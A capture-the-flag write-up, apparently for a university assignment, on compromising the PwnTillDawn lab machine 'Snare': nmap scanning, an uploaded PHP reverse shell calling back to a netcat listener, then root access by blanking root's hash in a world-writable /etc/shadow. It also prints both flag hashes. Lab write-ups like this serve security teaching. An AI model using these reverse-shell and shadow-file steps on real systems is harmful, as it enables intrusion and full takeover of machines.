# PwnTillDawn — Snare Machine Writeup

> **Platform:** PwnTillDawn Online Battlefield  
> **Target IP:** `10.150.150.18`  
> **Difficulty:** Beginner  
> **Category:** Web Exploitation · Privilege Escalation  
> **Flags Captured:** 2 / 2 ✅

---

## Table of Contents

1. [Environment Setup — VPN Connection](#1-environment-setup--vpn-connection)
2. [Host Discovery — Network Scan](#2-host-discovery--network-scan)
3. [Target Enumeration — Port Scan](#3-target-enumeration--port-scan)
4. [Web Application Reconnaissance](#4-web-application-reconnaissance)
5. [Exploitation — Web Reverse Shell](#5-exploitation--web-reverse-shell)
6. [Flag 1 — Initial Foothold](#6-flag-1--initial-foothold)
7. [Privilege Escalation — /etc/shadow Edit](#7-privilege-escalation--etcshadow-edit)
8. [Flag 2 — Root Access](#8-flag-2--root-access)

---

## 1. Environment Setup — VPN Connection

Before connecting to the PwnTillDawn network, download the `.ovpn` configuration file from the platform and connect using OpenVPN.

```bash
sudo openvpn PwnTillDawn.ovpn
```

Wait until you see `Initialization Sequence Completed` in the terminal output — this confirms the VPN tunnel is active and you are inside the PwnTillDawn network range (`10.150.150.0/24`).

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20224956.png)

---

## 2. Host Discovery — Network Scan

With the VPN established, perform a **ping sweep** across the PwnTillDawn IP range to identify live hosts.

```bash
nmap -sn 10.150.150.10-254
```

| Option | Description |
|--------|-------------|
| `-sn`  | Ping scan only — no port scan, just host discovery |

**Result:** 47 live hosts detected. The target machine at `10.150.150.18` was identified.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20225024.png)

---

## 3. Target Enumeration — Port Scan

Run a detailed service and version scan against the target to identify open ports and running services.

```bash
nmap -sC -sV -v 10.150.150.18 -oN nmap
```

| Option  | Description |
|---------|-------------|
| `-sC`   | Run default NSE scripts |
| `-sV`   | Detect service versions |
| `-v`    | Verbose output |
| `-oN nmap` | Save output to a file named `nmap` |

**Results:**

| Port | State | Service |
|------|-------|---------|
| 80   | Open  | HTTP (web server) |

Only **port 80 (HTTP)** is open on this machine.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20230123.png)

---

## 4. Web Application Reconnaissance

Open a browser and navigate to the target's web server:

```
http://10.150.150.18
```

Explore the web application to understand its structure and identify any input fields, upload functionality, or file inclusion points that can be leveraged.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20230328.png)

---

## 5. Exploitation — Web Reverse Shell

### 5.1 Prepare the Reverse Shell

The web application has a vulnerability that allows uploading or injecting a **PHP web reverse shell**.

Use the **pentestmonkey PHP reverse shell** (available at `/usr/share/webshells/php/php-reverse-shell.php` on Kali Linux).

Edit the shell file to set your attacker IP and port:

```php
$ip = '10.150.150.XXX';   // Your VPN IP
$port = 1234;              // Your listening port
```

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20233707.png)

### 5.2 Set Up a Netcat Listener

On your attacking machine, start a netcat listener **before** triggering the shell:

```bash
nc -lvnp 1234
```

| Option | Description |
|--------|-------------|
| `-l`   | Listen mode |
| `-v`   | Verbose |
| `-n`   | No DNS resolution |
| `-p`   | Port number |

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234229.png)

### 5.3 Upload and Trigger the Shell

Upload the PHP reverse shell through the web application's upload or file inclusion mechanism, then navigate to the uploaded file in your browser to trigger execution.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234202.png)

### 5.4 Shell Received

Once the browser accesses the shell file, a reverse connection is established back to your listener.

```
listening on [any] 1234 ...
connect to [10.150.150.XXX] from (UNKNOWN) [10.150.150.18] XXXXX
Linux snare 4.19.0-16-amd64 ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You now have a shell as `www-data`.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20234239.png)

---

## 6. Flag 1 — Initial Foothold

With the reverse shell active, search for the first flag. The flag hash is retrieved from the file system.

```bash
cat /path/to/flag1
```

> **Flag 1:** `e335462da856f39997bffdc04b8d89ce1104fcc5`

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234942.png)

---

## 7. Privilege Escalation — /etc/shadow Edit

### 7.1 Check for Write Access

Enumerate what writable files or sudo privileges are available to the current `www-data` user.

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

The `/etc/shadow` file is found to be **world-writable** — a serious misconfiguration.

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20003412.png)

### 7.2 Read the Shadow File

```bash
vim /etc/shadow
```

Copy the top two lines (root and the next user) into a notepad for reference.

The root line will look similar to:

```
root:$6$<hash>:18586:0:99999:7:::
```

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20003813.png)

### 7.3 Remove the Root Password Hash

In vim, navigate to the root line and **remove the password hash**, leaving the field empty. This effectively sets root's password to blank (no password required).

Using vim commands:
1. Navigate to the root line
2. Delete the hash field using `dd` and replace with the blank-password format
3. The modified line should look like:

```
root::18586:0:99999:7:::
```

> **Vim tip:** Use `0` to go to start of line, delete to the next `:` and paste your modified line.

```vim
# After editing, save and quit:
:wq!
```

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/2ffbb9e33d54b78abebe142a35386597e4b668c3/images/Screenshot%202026-04-05%20004251.png)

### 7.4 Switch to Root

Now switch to root using the blank password:

```bash
su root
# Press Enter when prompted for password (blank)
```

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20004816.png)

Confirm root access:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

## 8. Flag 2 — Root Access

With root privileges, navigate to the root home directory and retrieve the second flag.

```bash
cat /root/flag.txt
# or check common flag locations
find / -name "flag*" 2>/dev/null
```

> **Flag 2:** `2b0286a69b276189afe50517304963e5fa5982d9`

![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/2ffbb9e33d54b78abebe142a35386597e4b668c3/images/Screenshot%202026-04-05%20004932.png)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **OpenVPN** | Connect to the PwnTillDawn lab network |
| **Nmap** | Host discovery and port/service enumeration |
| **Web Browser** | Web application reconnaissance |
| **PHP Reverse Shell** | Gain initial foothold via web exploitation |
| **Netcat (`nc`)** | Catch the incoming reverse shell connection |
| **Vim** | Edit `/etc/shadow` for privilege escalation |

> *This writeup was produced for educational purposes as part of a university cybersecurity assignment.*
